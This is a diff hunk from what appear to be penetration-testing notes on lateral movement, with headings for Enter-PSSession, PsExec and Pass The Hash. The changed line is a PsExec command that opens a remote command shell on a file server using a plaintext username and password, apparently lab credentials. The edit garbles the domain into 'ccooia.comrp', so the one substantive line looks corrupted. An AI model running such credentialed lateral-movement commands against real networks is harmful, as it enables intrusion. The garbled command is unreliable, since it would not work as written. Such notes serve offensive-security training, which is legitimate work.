@@ -41,7 +41,7 @@ Enter-PSSession 1
 
 ### PSExec
 
-./PsExec64.exe -i  \\FILES04 -u ccoorp\jen -p Nexus123! cmd
+./PsExec64.exe -i  \\FILES04 -u ccooia.comrp\jen -p Nexus123! cmd
 
 ### Pass The Hash
 
